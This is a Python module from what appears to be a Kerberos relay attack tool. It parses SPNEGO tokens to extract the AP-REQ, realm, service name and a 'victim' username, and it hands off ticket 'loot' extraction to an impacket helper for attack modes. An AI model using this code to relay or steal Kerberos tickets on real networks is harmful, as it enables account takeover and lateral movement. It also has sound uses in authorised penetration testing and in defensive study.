# -*- coding: utf-8 -*-
"""Kerberos auth extraction for relay mode (pyasn1 only)."""

from __future__ import annotations

import random
from typing import Any, Dict, Optional

from pyasn1.codec.der import decoder
from pyasn1.error import PyAsn1Error

from lib.protocols.kerberos.krb_relay.utils.spnego import GSSAPIHeader_KRB5_AP_REQ, GSSAPIHeader_SPNEGO_Init


def get_auth_data(token: bytes, options: Any = None) -> Dict[str, Any]:
    blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
    data = bytes(blob["innerContextToken"]["negTokenInit"]["mechToken"])
    try:
        payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error as exc:
        raise Exception("Error obtaining Kerberos data") from exc

    apreq = payload["apReq"]
    domain = str(apreq["ticket"]["realm"]).lower()
    sname = "/".join(str(item) for item in apreq["ticket"]["sname"]["name-string"])
    victim = getattr(options, "victim", None) if options is not None else None
    username = victim if victim else f"unknown{random.randint(0, 10000):04d}$"
    return {
        "domain": domain,
        "username": username,
        "krbauth": token,
        "service": sname,
        "apreq": apreq,
    }


def get_kerberos_loot(token: bytes, options: Any) -> Optional[Dict[str, Any]]:
    """Ticket extraction requires impacket (EXPORT/ATTACK modes only)."""
    try:
        from lib.protocols.kerberos.krb_relay.utils.kerberos_impacket import get_kerberos_loot as _loot
    except ImportError as exc:
        raise ImportError("impacket is required for Kerberos ticket export mode") from exc
    return _loot(token, options)
